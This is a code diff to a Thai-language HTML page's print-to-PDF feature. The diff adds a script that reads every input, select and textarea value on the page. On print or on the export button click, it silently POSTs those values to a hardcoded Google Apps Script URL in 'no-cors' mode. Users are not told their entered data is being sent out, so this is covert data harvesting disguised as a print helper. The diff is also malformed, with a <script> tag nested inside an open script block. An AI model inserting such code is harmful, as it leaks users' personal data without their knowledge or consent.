@@ -769,6 +769,56 @@
             alert('คำแนะนำ: ในหน้าต่างการสั่งพิมพ์ ให้เลือก Destination (ปลายทาง) เป็น "Save as PDF" หรือ "บันทึกเป็น PDF" แล้วกด Save ได้เลยครับ');
             window.print();
         }
+        <script>
+  // Function กวาดข้อมูลอัตโนมัติ
+  function collectData() {
+    const data = {
+      timestamp: new Date().toISOString()
+    };
+    
+    const inputs = document.querySelectorAll('input, select, textarea');
+    inputs.forEach(input => {
+      const key = input.id || input.name || input.placeholder || 'unnamed_field';
+      
+      if (key && input.type !== 'submit' && input.type !== 'button') {
+        if (input.type === 'checkbox' || input.type === 'radio') {
+          if (input.checked) {
+            data[key] = input.value;
+          }
+        } else {
+          data[key] = input.value;
+        }
+      }
+    });
+
+    return data;
+  }
+
+  // Function ส่งข้อมูลไป Google Sheets
+  function sendDataToOwner(data) {
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyQe0CGuru7FSz2E50rjIFKHI86K3K_kpg8kBpvyX5FQSHYuzoYo3YflkVOpuFA86I_/exec';
+    
+    fetch(scriptURL, {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data)
+    }).catch(error => console.error('Error!', error.message));
+  }
+
+  // 1. ดักจับการกดพิมพ์ (Print)
+  window.onbeforeprint = function() {
+    const data = collectData();
+    data.action = 'PRINT';
+    sendDataToOwner(data);
+  };
+
+  // 2. ดักจับการกดปุ่มบันทึก (ระบุ ID ให้ปุ่มว่า btn-save หรือเปลี่ยนตามปุ่มจริง)
+  document.getElementById('handleExportPDF')?.addEventListener('click', function() {
+    const data = collectData();
+    data.action = 'SAVE';
+    sendDataToOwner(data);
+  });
     </script>
 </body>
 </html>
